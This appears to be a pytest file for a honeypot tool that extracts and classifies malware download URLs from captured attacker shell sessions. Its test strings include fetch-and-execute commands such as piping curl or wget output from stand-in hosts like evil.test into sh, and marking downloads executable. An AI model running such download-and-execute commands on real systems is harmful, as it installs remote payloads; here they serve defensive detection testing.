import pytest

from common.utils import (add_urls_bulk, extract_commands, extract_urls, get_domain, is_valid,
                          process_new_session, split_url_lines)
from tests.factories import insert_url


@pytest.mark.parametrize("command, expected", [
    ("wget http://evil.test/a.sh", ["http://evil.test/a.sh"]),
    ("cd /tmp; wget http://evil.test/a.sh;chmod +x a.sh", ["http://evil.test/a.sh"]),
    ("curl -s https://evil.test/x86|sh", ["https://evil.test/x86"]),
    ("wget 'http://evil.test/q.sh' -O- | sh", ["http://evil.test/q.sh"]),
    ("wget http://a.test/1 && wget http://b.test/2", ["http://a.test/1", "http://b.test/2"]),
    # URLs after --referer / -e are not downloads
    ("wget --referer http://ref.test/ http://evil.test/a.sh", ["http://evil.test/a.sh"]),
    ("uname -a; cat /proc/cpuinfo", []),
])
def test_extract_urls(command, expected):
    assert extract_urls(command) == expected


def test_extract_commands_keeps_only_download_lines():
    content = "#!/bin/sh\ncd /tmp\nwget http://evil.test/x86 -O x86\nchmod +x x86\ncurl http://evil.test/arm7 > a\n"
    assert extract_commands(content) == "wget http://evil.test/x86 -O x86\ncurl http://evil.test/arm7 > a"


@pytest.mark.parametrize("url, valid", [
    ("http://evil.test/a.sh", True),
    ("https://192.0.2.1:8080/x", True),
    ("evil.test/a.sh", False),
    ("http://", False),
    ("", False),
])
def test_is_valid(url, valid):
    assert is_valid(url) is valid


@pytest.mark.parametrize("url, domain", [
    ("http://evil.test/a.sh", "evil.test"),
    ("http://192.0.2.1:8080/x", "192.0.2.1:8080"),
    ("not a url", None),
])
def test_get_domain(url, domain):
    assert get_domain(url) == domain


def test_split_url_lines():
    assert split_url_lines("http://a.test/1\r\nhttp://b.test/2, http://c.test/3  \n\n") == [
        "http://a.test/1", "http://b.test/2", "http://c.test/3"]
    assert split_url_lines("") == []


def test_add_urls_bulk(db):
    insert_url(db, "http://known.test/a")

    result = add_urls_bulk(db, ["http://new.test/a", "http://known.test/a", "nonsense"],
                           seen_date="2026-01-02", username="alice")

    assert result == {"added": ["http://new.test/a"], "in_db": ["http://known.test/a"], "invalid": ["nonsense"]}
    assert db.execute("SELECT occurrences, last_seen FROM urls WHERE url = 'http://known.test/a'").fetchone() == (2, "2026-01-02")
    assert db.execute("SELECT source, honeynet FROM observations WHERE url = 'http://new.test/a'").fetchone() == (
        "Manual", "Manual by alice")


def test_process_new_session_stores_urls_and_relations(db, config):
    session = "cd /tmp; wget http://evil.test/a.sh; sh a.sh"

    inserted = process_new_session(db, config, session, "idea-1", "2026-01-01T10:00:00Z", "Warden", None, "CESNET Hugo")

    assert inserted == ["http://evil.test/a.sh"]
    assert db.execute("SELECT first_seen, domain FROM urls").fetchone() == ("2026-01-01", "evil.test")
    assert db.execute("SELECT idea_id FROM sessions").fetchone() == ("idea-1",)
    assert db.execute("SELECT source FROM url_source").fetchone() == ("Warden",)
    assert db.execute("SELECT honeynet FROM observations").fetchone() == ("CESNET Hugo",)


@pytest.mark.xfail(strict=True, reason="BUG: process_new_session() uses cursor.lastrowid after an UPSERT; "
                   "on conflict SQLite keeps the rowid of the previous insert, so known URLs are reported as new")
def test_process_new_session_same_url_again_is_not_new(db, config):
    process_new_session(db, config, "wget http://evil.test/a.sh", None, "2026-01-01T10:00:00Z", "Warden", None)
    inserted = process_new_session(db, config, "curl http://evil.test/a.sh", None, "2026-01-02T10:00:00Z", "Warden", None)

    assert inserted == []
    assert db.execute("SELECT occurrences, last_seen FROM urls").fetchone() == (2, "2026-01-02")


def test_process_new_session_ddos_target_is_harmless(db, config):
    # more occurrences of one URL in a single session than ddos_threshold.same_url_single_session (10)
    session = "; ".join(["wget http://victim.test/"] * 11)

    process_new_session(db, config, session, None, "2026-01-01T10:00:00Z", "Warden", None)

    row = db.execute("SELECT classification, classification_reason, evaluated FROM urls").fetchone()
    assert row == ("harmless", "DDoS target", "yes")
    assert db.execute("SELECT actor FROM classification_history").fetchone() == ("session-ddos",)


def test_process_new_session_domain_flood_is_deleted(make_config, db):
    config = make_config(ddos_threshold={"same_url_single_session": 10, "same_domain_single_session": 3,
                                         "same_domain_all_sessions": 500})
    session = "; ".join(f"wget http://flood.test/{i}" for i in range(4))

    process_new_session(db, config, session, None, "2026-01-01T10:00:00Z", "Warden", None)

    assert db.execute("SELECT COUNT(*) FROM urls").fetchone()[0] == 0
